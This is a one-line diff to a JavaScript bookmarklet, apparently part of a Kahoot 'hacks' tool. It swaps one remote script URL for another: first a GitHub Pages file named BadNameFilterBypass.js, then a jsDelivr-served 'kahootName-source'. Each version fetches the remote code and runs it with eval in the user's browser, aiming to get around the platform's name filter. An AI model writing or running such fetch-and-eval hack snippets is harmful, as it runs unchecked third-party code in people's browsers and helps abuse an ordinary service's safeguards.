@@ -1,1 +1,1 @@
-javascript:fetch('https://thatfrueddued.github.io/kahoot-smasher/BadNameFilterBypass.js').then(function(response){response.text().then(function(text){eval(text);});});
+javascript:fetch('https://cdn.jsdelivr.net/gh/BizmoFunions895/hacks_sourceCode-links@main/kahootName-source').then(function(response){response.text().then(function(text){eval(text);});});
